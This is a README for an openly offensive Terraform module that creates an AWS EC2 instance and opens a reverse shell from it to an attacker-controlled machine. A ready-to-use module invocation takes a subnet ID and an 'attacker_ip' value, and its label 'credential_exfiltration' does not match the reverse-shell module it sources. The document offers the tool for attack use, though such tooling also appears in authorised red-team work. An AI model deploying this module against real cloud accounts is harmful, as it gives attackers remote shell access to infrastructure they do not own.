# AWS EC2 Instance Reverse Shell Module

![OffensiveTerraform](https://img.shields.io/badge/hack-success)
![OffensiveTerraform](https://img.shields.io/badge/offensive-terraform-blueviolet)
![OffensiveTerraform](https://img.shields.io/badge/aws-important)

Offensive Terraform module which creates EC2 instance and reverse shell from an EC2 instance to attacker machine.

![Attack Diagram](https://raw.githubusercontent.com/offensive-terraform/terraform-aws-ec2-instance-reverse-shell/master/diagram.jpg)

## Usage
```
module "ec2_instance_credential_exfiltration" {
    source  = "offensive-terraform/ec2-instance-reverse-shell/aws"

    subnet_id = "subnet-0a4a1cc04"
    attacker_ip = "0.0.0.0"
}
```
## Author
Module managed by https://github.com/iganbold